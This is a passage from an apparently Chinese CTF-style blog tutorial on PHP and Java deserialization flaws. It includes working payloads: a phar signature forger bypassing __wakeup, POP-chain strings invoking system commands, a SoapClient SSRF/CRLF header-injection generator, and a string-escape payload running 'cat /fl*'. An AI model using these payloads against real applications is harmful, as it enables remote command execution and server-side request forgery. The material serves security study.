<td align="left">实际的签名长度，SHA1 签名占用 20 字节，MD5 签名占用 16 字节，SHA256 签名占用 32 字节，而 SHA512 签名为 64 字节，OPENSSL 格式的签名长度取决于私钥的大小</td>
</tr>
<tr>
<td align="center">4 字节</td>
<td align="left">签名标志。0x0001 用于MD5，0x0002 用于SHA1，0x0003 代表了 SHA256，0x0004 表示为 SHA512，0x0010 用于定义 OPENSSL</td>
</tr>
<tr>
<td align="center">4 字节</td>
<td align="left">GBMB 末尾标识</td>
</tr>
</tbody></table>
<p>修改签名测试用例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPhar</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        f = file.read()</span><br><span class="line">    s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）</span></span><br><span class="line">    s = s.replace(<span class="string">b&#x27;3:&#123;&#x27;</span>, <span class="string">b&#x27;4:&#123;&#x27;</span>)<span class="comment"># 绕过__wakeup</span></span><br><span class="line">    h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型以及GBMB标识，各4个字节</span></span><br><span class="line">    newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line">    <span class="keyword">return</span> gzip.compress(newf)<span class="comment"># 进行gzip压缩</span></span><br></pre></td></tr></table></figure>

<h3 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>在 php 中，当对象被销毁时会自动调用 <code>__destruct()</code> 方法，但如果程序报错或者抛出异常，就不会触发该魔术方法</p>
<p><code>__destruct()</code> 魔术方法的触发条件就是一个类被销毁时触发，而 <code>throw</code> 函数就是回收了自动销毁的类，导致 <code>__destruct</code> 检测不到有东西销毁，从而也就导致无法触发 <code>__destruct</code> 函数</p>
<p>绕过 <code>throw</code> 异常方法有以下三个：</p>
<ul>
<li>数组对象设为 NULL</li>
<li>去掉序列化最后一个中括号</li>
<li>修改属性数字</li>
</ul>
<h4 id="数组对象设为-NULL"><a href="#数组对象设为-NULL" class="headerlink" title="数组对象设为 NULL"></a>数组对象设为 NULL</h4><p>将对象放在数组中一起进行序列化，如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title class_">Start</span>(); <span class="comment">//原序列化对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="variable">$s</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;i:1;i:0;&#125;</span><br></pre></td></tr></table></figure>

<p>然后将第二个元素的键值改为 0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;i:0;i:0;&#125;</span><br></pre></td></tr></table></figure>

<p>因为当反序列化的时候第一层接受到的是一个包含两个元素的数组，该数组第一个元素是一个对象，其类名为 <code>Start</code>，第二个元素是一个整数 0。把第二个 <code>i</code> 后面的值改为 0 后，使得数组对象为空。异常在这一层就抛出来，而已经序列化成功的 <code>$s</code>（pop链）正常执行</p>
<h3 id="SoapClient-原生类利用"><a href="#SoapClient-原生类利用" class="headerlink" title="SoapClient 原生类利用"></a><code>SoapClient</code> 原生类利用</h3><p><code>SoapClient</code> 的魔术方法 <code>__call</code>，当访问类中一个不存在的方法时触发，该方法就会被传递给 <code>__call</code> 方法进行处理，并将其转化为一条SOAP 请求发送给 Web 服务</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;token=ctfshow&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;Chrome^^X-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded&#x27;</span>. </span><br><span class="line">        <span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;dwzzzzzzzzzz&quot;</span>));</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中，<code>location</code> 为 Web 服务的地址，<code>uri</code> 为 Web 服务的命名空间</p>
<h3 id="php-反序列化字符串逃逸"><a href="#php-反序列化字符串逃逸" class="headerlink" title="php 反序列化字符串逃逸"></a>php 反序列化字符串逃逸</h3><p>PHP 反序列化时，会有以下几种特点：</p>
<blockquote>
<p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾(字符串除外)，并且是根据长度判断内容的 ，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化。</p>
</blockquote>
<p>例如下图超出的 <code>abcd</code> 部分并不会被反序列化成功：</p>
<img src="/2024/08/15/deserialization/serialize-1.png" class="">

<blockquote>
<p>当序列化的长度不对应的时候则会出现报错</p>
</blockquote>
<blockquote>
<p>可以反序列化类中不存在的元素</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;purplet&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$age</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;O:4:&quot;user&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;purplet&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;s:6:&quot;gender&quot;;s:3:&quot;boy&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>字符逃逸的本质其实也是闭合，但是它分为两种情况，一是字符变多，二是字符变少</p>
<h4 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h4><p>当存在一个过滤函数，过滤序列化后的字符串时会让字符串中的字符变多，如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure>

<p>那么可以计算需要构造的代码长度构造合适的 payload，进行逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:8:&quot;cat /fl*&quot;;&#125;</span><br></pre></td></tr></table></figure>




<h2 id="Java-反序列化漏洞"><a href="#Java-反序列化漏洞" class="headerlink" title="Java 反序列化漏洞"></a>Java 反序列化漏洞</h2><blockquote>
<p>Java 中通常使用 <code>Java.io.ObjectOutputStream</code> 类中的 <code>writeObject</code> 方法进行序列化；使用 <code>Java.io.ObjectInputStream</code> 类中的 <code>readObject</code> 方法进行反序列化</p>
</blockquote>
<p>Java 序列化数据格式始终以 <code>0xAC ED 00 05</code> 开头，前两个字节是固定的，后两个字节为版本号</p>
<p>一个类的对象要想序列化，必须满足两个条件：</p>
<ul>
<li>该类必须实现 <code>java.io.Serializable</code> 接口</li>
<li>该类的所有属性必须是可序列化的</li>
</ul>
<p>如下类所示：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个实现 java.io.Serializable 接口的类Test</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">    <span class="comment">// 重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="comment">// 执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">// 执行打开计算器程序的命令</span></span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em>现实环境中需要去寻找 POP 链</em></p>
<h3 id="Java-反射机制"><a href="#Java-反射机制" class="headerlink" title="Java 反射机制"></a>Java 反射机制</h3><blockquote>
<p>Java 反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法；这种动态获取的信息以及动态调用对象的方法的功能称为 Java 语言的反射机制</p>
</blockquote>
<p>获取反射中的 Class 对象的三种方法：</p>
<ol>
<li><code>clazz = Class.forName(&quot;com.meituan.data.springbootdemo.User&quot;)</code> : 通过类的全限定名获取 Class 对象</li>
<li><code>clazz = user.getClass()</code> : </li>
<li><code>clazz = User.class</code> : 只适合在编译前就知道操作的 Class</li>
</ol>
<hr>
<p>判断一个 Class 对象是否是某个类的实例的两种方法：</p>
<ol>
<li><code>isInstance = user instanceof User</code></li>
<li><code>isInstance = clazz.isInstance(user)</code></li>
</ol>
<hr>
<p>通过反射创建实例对象的两种方法：</p>
<ol>
<li>Class 对象的 <code>newInstance</code> 方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> (Apple)clz.newInstance();</span><br></pre></td></tr></table></figure></li>
<li>Constructor 对象的 <code>newInstance</code> 方法<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor();</span><br><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> (Apple)constructor.newInstance();</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>通过反射获取类的属性：</p>
<ol>
<li>通过 Class 对象的 <code>getFields()</code> 方法可以获取 Class 类的属性，但无法获取私有属性<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line">Field[] fields = clz.getFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>使用 Class 对象的 <code>getDeclaredFields()</code> 方法则可以获取包括私有属性在内的所有属性<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Apple.class;</span><br><span class="line">Field[] fields = clz.getDeclaredFields();</span><br><span class="line"><span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">    System.out.println(field.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<p>通过反射获取类的方法并调用该方法(invoke)：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getAge&quot;</span>,<span class="literal">null</span>);  System.out.println(method.invoke(user));</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="FastJSON-反序列化漏洞"><a href="#FastJSON-反序列化漏洞" class="headerlink" title="FastJSON 反序列化漏洞"></a>FastJSON 反序列化漏洞</h3><p>。。。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]. <a target="_blank" rel="noopener" href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">反序列化漏洞及各种绕过姿势</a></p>
<p>[2]. <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/276624.html">常见的Web漏洞——反序列化漏洞</a></p>
<p>[3]. <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjeauisbeWbbDu7AoD#toc-5">pickle 反序列化初探</a></p>
<p>[4]. <a target="_blank" rel="noopener" href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">大白话说Java反射</a></p>
</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-08-15</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web/" title="web">web </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2024/08/15/deserialization/,Mini's blog,反序列化,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2024/09/02/jwt/" title="jwt">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/07/08/LLM-Framework/" title="LLM 框架">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>